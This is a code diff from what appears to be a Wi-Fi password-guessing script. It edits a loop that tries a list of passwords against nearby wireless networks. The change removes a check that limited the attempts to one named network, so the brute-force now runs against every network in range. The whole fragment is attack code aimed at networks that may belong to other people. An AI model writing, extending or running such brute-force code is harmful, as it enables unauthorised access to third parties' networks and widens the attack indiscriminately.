@@ -59,16 +59,15 @@ def bust():
 
     if len(networks) > 0:
         for network in networks:
-            if network == "TCHPNRD13M":
-                for password in passwords:
-                    print(f"Attempting to join \"{network}\" using password \"{password}\"...")
-                    connect_to_network(network, password, os_name)
-                    if is_connected(os_name):
-                        print(colored(f"Connected to network {network} using \"{password}\".", "green"))
-                        return True
-                    else:
-                        print(colored(f"Could not connect to network {network} using \"{password}\".", "red"))
-                    print("")
+            for password in passwords:
+                print(f"Attempting to join \"{network}\" using password \"{password}\"...")
+                connect_to_network(network, password, os_name)
+                if is_connected(os_name):
+                    print(colored(f"Connected to network {network} using \"{password}\".", "green"))
+                    return True
+                else:
+                    print(colored(f"Could not connect to network {network} using \"{password}\".", "red"))
+                print("")
     else:
         print("No networks found.")
 
